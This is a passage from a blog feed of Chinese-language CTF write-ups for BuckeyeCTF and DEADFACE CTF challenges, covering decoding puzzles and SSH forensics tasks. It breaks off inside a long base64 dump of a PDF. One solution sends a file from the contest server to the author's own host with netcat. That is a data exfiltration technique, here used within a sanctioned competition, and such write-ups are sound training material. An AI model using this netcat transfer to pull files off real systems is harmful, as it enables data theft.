span.classList.add(`flag-char-$&#123;i&#125;`); span.textContent = String.fromCharCode(x); flagElement.appendChild(span); return span; &#125;); 查看main.css,发现span都被设置了order属性. 我们可以把main.css,main.js和网页源代码a.html下载到本地.然后注释掉main.js里弹窗和阻止滚动的代码. 打开a.html,发现本应该显示flag的地方有一个灰色的框. 编辑a.html,将 &lt;code id=&quot;flag&quot;&gt;&lt;/code&gt;这一行代码移动至&lt;pre&gt;标签外面,即可看到flag. flag:buckeye&#123;h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3&#125;","date_published":"2021-10-27T18:22:30.000Z","tags":["CTF","CTF","BuckeyeCTF"]},{"id":"https://zhaoqi.vip/posts/2879210530/","url":"https://zhaoqi.vip/posts/2879210530/","title":"DEADFACECTF Writeup","content_html":"<h1 id=\"Poor-MEAGAN\"><a href=\"#Poor-MEAGAN\" class=\"headerlink\" title=\"Poor MEAGAN!\"></a>Poor MEAGAN!</h1><p><em>Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.</em></p>\n<p><em>The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh&#x2F;9dwz1QfGXm+b9&#x3D;wKslL1Zpb45</em></p>\n<hr>\n<p>看起来像一个base64字符串,但是似乎被混淆了,使用<a href=\"https://gchq.github.io/CyberChef/#recipe=From_Base64('3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5',true)&input=ajJyWGp4OWRraFc5ZUxLc25NUjljTERWamgvOWR3ejFRZkdYbStiOT13S3NsTDFacGI0NQ\">CyberChef</a>搭配Megan35解码即可</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Crypto/images/Poor_Meagan.png\" alt=\"CyberChef\"></p>\n<p><strong>flag:</strong><code>flag&#123;Six-Parts-Honey-One-Part-Garlic&#125;</code></p>\n<h1 id=\"To-Be-Xor-Not-to-Be\"><a href=\"#To-Be-Xor-Not-to-Be\" class=\"headerlink\" title=\"To Be Xor Not to Be\"></a>To Be Xor Not to Be</h1><p><em>.$)&#x2F;3&lt;’e-)&lt;e’:e&amp;’&lt;e&lt;’e-)&lt;5</em></p>\n<p><em>Submit the flag as flag{here-is-the-answer}</em></p>\n<hr>\n<p>直接使用<a href=\"https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&input=LiQpLzM8J2UtKTxlJzplJic8ZTwnZS0pPDU\">CyberChef</a>里的XOR Brute Force即可:</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Crypto/images/To_Be_Xor_Not_to_Be.png\" alt=\"To_Be_Xor_Not_to_Be\"></p>\n<p><strong>flag:</strong><code>flag&#123;to-eat-or-not-to-eat&#125;</code></p>\n<h1 id=\"Blood-Bash\"><a href=\"#Blood-Bash\" class=\"headerlink\" title=\"Blood Bash\"></a>Blood Bash</h1><p><em>We’ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.</em></p>\n<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>\n<p><em>bloodbash.deadface.io:22</em></p>\n<hr>\n<p>使用<code>ssh</code>命令连接,<code>ls - R</code>后发现<code>Documents</code>目录下有一个<code>flag.txt</code>文件,直接<code>cat</code>即可.</p>\n<pre><code class=\"shell\">╭─ ~/CTF/DEADFACECTF\n╰─$ ssh bl0ody_mary@bloodbash.deadface.io\nbl0ody_mary@bloodbash.deadface.io&#39;s password: \nbl0ody_mary@16ef1481fce1:~$ ls -R\n.:\n&#39;De Monne Customer Portal.pdf&#39;   Documents   Downloads   Music   Pictures   Videos\n\n./Documents:\nflag1.txt\n\n./Downloads:\n\n./Music:\n\n./Pictures:\n\n./Videos:\nbl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt\nflag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125;</code></p>\n<h1 id=\"Blood-Bash-2\"><a href=\"#Blood-Bash-2\" class=\"headerlink\" title=\"Blood Bash 2\"></a>Blood Bash 2</h1><p><em>We’ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.</em></p>\n<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>\n<p><em>bloodbash.deadface.io:22</em></p>\n<hr>\n<p>在<code>Documents</code>目录<code>ls -a</code>后发现存在文件<code>.demonne_info.txt</code>,<code>cat</code>即可</p>\n<pre><code class=\"shell\">bl0ody_mary@16ef1481fce1:~$ ls -a\n.  ..  flag.txt  .demonne_info.txt\nbl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt\nflag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125;</code></p>\n<h1 id=\"Blood-Bash-3\"><a href=\"#Blood-Bash-3\" class=\"headerlink\" title=\"Blood Bash 3\"></a>Blood Bash 3</h1><p><em>There’s a flag on this system that we’re having difficulty with. Unlike the previous flags, we can’t seem to find a file with this flag in it. Perhaps the flag isn’t stored in a traditional file?</em></p>\n<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>\n<p><em>bloodbash.deadface.io:22</em></p>\n<hr>\n<p>在Unix&#x2F;Linux系统中“一切皆文件”,socket也被认为是一种文件.</p>\n<p>题意提示我们flag没有被存储在传统文件中,运行<code>netstat -ano</code></p>\n<pre><code class=\"shell\">bl0ody_mary@5349049d19cd:~$ netstat -ano\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\nudp        0      0 127.0.0.1:43526         0.0.0.0:*                           off (0.00/0/0)\n</code></pre>\n<p>注意到有本地43526端口的监听(UDP),用<code>nc</code>连接一下</p>\n<pre><code class=\"shell\">bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526\nflag&#123;open_port(al)s&#125;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;open_port(al)s&#125;</code></p>\n<h1 id=\"Blood-Bash-4\"><a href=\"#Blood-Bash-4\" class=\"headerlink\" title=\"Blood Bash 4\"></a>Blood Bash 4</h1><p><em>A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they’re creating for their consumers. Read the contents of the file and return the flag as <code>flag&#123;flag_goes_here&#125;</code>.</em></p>\n<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>\n<p><em>bloodbash.deadface.io:22</em></p>\n<hr>\n<p>测试后发现无法使用<code>curl</code>,只有<code>nc</code>可以使用.</p>\n<p><code>nc</code>也可以用来传输文件,首先在自己的VPS上使用<code>nc</code>监听6379端口,准备接收文件</p>\n<pre><code class=\"shell\">root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf\n</code></pre>\n<p>在比赛的服务器上用<code>nc</code>发送文件</p>\n<pre><code class=\"shell\">bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\\ Monne\\ Customer\\ Portal.pdf\n</code></pre>\n<p>下载pdf文件并打开,即可看到flag</p>\n<p><img data-src=\"/../../CTF/DEADFACECTF/Forensics/images/Blood_Bash4.png\" alt=\"Blood Bash 4\"></p>\n<h2 id=\"另一种解法\"><a href=\"#另一种解法\" class=\"headerlink\" title=\"另一种解法\"></a>另一种解法</h2><p>在比赛的服务器上使用<code>base64</code>命令将文件编码,复制后保存至本地文件<code>encoded</code></p>\n<pre><code class=\"shell\">~$ base64 De\\ Monne\\ Customer\\ Portal.pdf\nJVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4\nMjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg\nDQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0\nZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy\nRkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl\nbmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd\nPj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt\nDWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy\nL0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi\nYgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz\ndHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh\nZ2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw\nIFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5\nMi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj\ndDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08\nPC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw\nNjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq\nDTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj\nb2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl\nY3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL\nCwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM\nCgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn\nLCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e\nHiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA\nAAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA\nAAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ\nSlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx\ns7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH\ncx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4\nOTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi\no6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6\n/9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT\n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